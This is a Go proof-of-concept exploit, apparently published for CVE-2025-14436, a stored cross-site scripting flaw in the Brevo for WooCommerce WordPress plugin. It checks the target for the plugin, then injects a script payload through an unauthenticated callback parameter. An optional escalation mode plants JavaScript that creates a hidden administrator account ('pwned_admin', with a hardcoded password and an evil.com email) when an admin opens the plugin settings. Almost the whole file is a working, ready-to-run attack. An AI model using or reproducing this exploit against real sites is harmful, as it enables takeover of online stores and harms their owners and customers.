package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const banner = `
>> [ ONLINE ]    
    ╔═══════════════════════════════════════════════════════════════════════════════════════╗
    ║   CVE-2025-14436 - Brevo for WooCommerce Stored XSS                                   ║
    ║   Affected: Brevo for WooCommerce <= 4.0.49                                           ║
    ║   Author: MoritakaAz                                                                  ║
    ╚═══════════════════════════════════════════════════════════════════════════════════════╝

>> [ INFORMATION ]
`

func main() {
	targetURL := flag.String("u", "", "Target WordPress URL (required)")
	payload := flag.String("p", "", "XSS payload to inject")
	checkOnly := flag.Bool("check-only", false, "Only check if plugin is active")
	escalate := flag.Bool("escalate", false, "Use admin user creation payload (creates pwned_admin)")
	adminUser := flag.String("admin-user", "pwned_admin", "Username for new admin (with --escalate)")
	adminPass := flag.String("admin-pass", "Pwned123!@#", "Password for new admin (with --escalate)")
	adminEmail := flag.String("admin-email", "pwned@evil.com", "Email for new admin (with --escalate)")
	timeout := flag.Int("timeout", 30, "Request timeout in seconds")

	flag.Parse()

	fmt.Println(banner)

	if *targetURL == "" {
		fmt.Println("[-] Error: Target URL is required (-u)")
		flag.PrintDefaults()
		return
	}

	*targetURL = strings.TrimRight(*targetURL, "/")

	client := &http.Client{
		Timeout: time.Duration(*timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	pluginActive := checkPlugin(client, *targetURL)
	if pluginActive {
		fmt.Println("[+] Plugin detected!")
	} else {
		fmt.Println("[-] Plugin not detected (may still be active)")
	}

	if *checkOnly {
		fmt.Println("\n[*] Check-only mode, exiting...")
		return
	}

	// Determine payload to use
	if *escalate {
		// Generate admin creation payload
		wpPath := strings.TrimPrefix(*targetURL, "http://")
		wpPath = strings.TrimPrefix(wpPath, "https://")
		if idx := strings.Index(wpPath, "/"); idx != -1 {
			wpPath = wpPath[idx:]
		} else {
			wpPath = ""
		}

		*payload = fmt.Sprintf(`'><script>fetch('%s/wp-admin/user-new.php',{credentials:'same-origin'}).then(r=>r.text()).then(h=>{var d=new DOMParser().parseFromString(h,'text/html'),n=d.querySelector('input[name="_wpnonce_create-user"]');if(!n)return;var f=new FormData();f.append('action','createuser');f.append('_wpnonce_create-user',n.value);f.append('_wp_http_referer','%s/wp-admin/user-new.php');f.append('user_login','%s');f.append('email','%s');f.append('pass1','%s');f.append('pass2','%s');f.append('role','administrator');f.append('createuser','Add New User');fetch('%s/wp-admin/user-new.php',{method:'POST',credentials:'same-origin',body:f})})</script>`,
			wpPath, wpPath, *adminUser, *adminEmail, *adminPass, *adminPass, wpPath)

		fmt.Println("\n[!] ESCALATION MODE: Admin user creation payload")
		fmt.Printf("[!] New admin credentials: %s / %s\n", *adminUser, *adminPass)
	} else if *payload == "" {
		// Default payload with breakout
		*payload = `'><script>alert('CVE-2025-14436-SUCCESS')</script>`
	} else {
		// Check if custom payload needs breakout sequence
		if !strings.HasPrefix(*payload, "'>") && !strings.HasPrefix(*payload, "\">") && !strings.HasPrefix(*payload, "' ") {
			fmt.Println("[*] Auto-prepending breakout sequence ('>) to custom payload...")
			*payload = "'>" + *payload
		}
	}

	fmt.Println("\n============================================================")
	fmt.Println("[*] EXPLOIT: Stored XSS Injection")
	fmt.Println("============================================================")

	fmt.Printf("\n[*] Target: %s\n", *targetURL)
	fmt.Printf("[*] Payload: %s\n", *payload)
	fmt.Println("\n[*] Sending malicious request...")

	success := injectXSS(client, *targetURL, *payload)

	if success {
		fmt.Println("\n[+] XSS payload injected successfully!")
		fmt.Println("[+] Payload will execute when admin visits:")
		fmt.Printf("    %s/wp-admin/admin.php?page=sendinblue\n", *targetURL)
		fmt.Println("\n[!] IMPORTANT: The XSS will trigger when any admin user")
		fmt.Println("    accesses the Brevo plugin settings page.")
	} else {
		fmt.Println("\n[-] Exploitation may have failed")
		fmt.Println("[-] Plugin might not be installed or callback endpoint is not accessible")
	}

	fmt.Println("\n[*] Done.")
}

func checkPlugin(client *http.Client, targetURL string) bool {
	paths := []string{
		"/wp-content/plugins/woocommerce-sendinblue-newsletter-subscription/readme.txt",
		"/wp-content/plugins/woocommerce-sendinblue-newsletter-subscription/woocommerce-sendinblue.php",
	}

	fmt.Println("[*] Checking if Brevo for WooCommerce plugin is active...")

	for _, path := range paths {
		checkURL := targetURL + path
		resp, err := client.Get(checkURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			fmt.Printf("[+] Plugin detected: %s\n", path)
			return true
		}
	}
	return false
}

func injectXSS(client *http.Client, targetURL, payload string) bool {
	callbackURL := targetURL + "/index.php?pagename=sendinblue-callback"

	formData := url.Values{}
	formData.Set("user_connection_id", payload)

	req, err := http.NewRequest("POST", callbackURL, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Printf("[-] Error creating request: %v\n", err)
		return false
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[-] Error sending request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if resp.StatusCode == 200 && strings.Contains(bodyStr, `"status":true`) {
		fmt.Println("[+] Server returned success status")
		return true
	}

	getURL := callbackURL + "&user_connection_id=" + url.QueryEscape(payload)

	req2, err := http.NewRequest("GET", getURL, nil)
	if err != nil {
		return false
	}
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp2, err := client.Do(req2)
	if err != nil {
		return false
	}
	defer resp2.Body.Close()

	body2, _ := io.ReadAll(resp2.Body)
	bodyStr2 := string(body2)

	if resp2.StatusCode == 200 && strings.Contains(bodyStr2, `"status":true`) {
		fmt.Println("[+] Server returned success status (via GET)")
		return true
	}

	return resp.StatusCode == 200 || resp2.StatusCode == 200
}
